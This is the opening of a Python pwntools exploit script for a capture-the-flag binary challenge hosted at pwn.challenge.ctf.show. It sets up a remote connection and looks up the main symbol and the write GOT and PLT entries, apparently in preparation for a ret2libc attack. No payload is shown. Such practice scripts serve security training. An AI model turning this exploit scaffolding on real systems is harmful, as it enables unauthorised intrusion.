from pwn import *
from LibcSearcher import *
context.log_level = 'debug'
#io = process('./pwn')
#io = remote('127.0.0.1',10000)
io = remote("pwn.challenge.ctf.show", 28177)
elf = ELF('./pwn')
main = elf.sym['main']
write_got = elf.got['write']
write_plt = elf.plt['write']
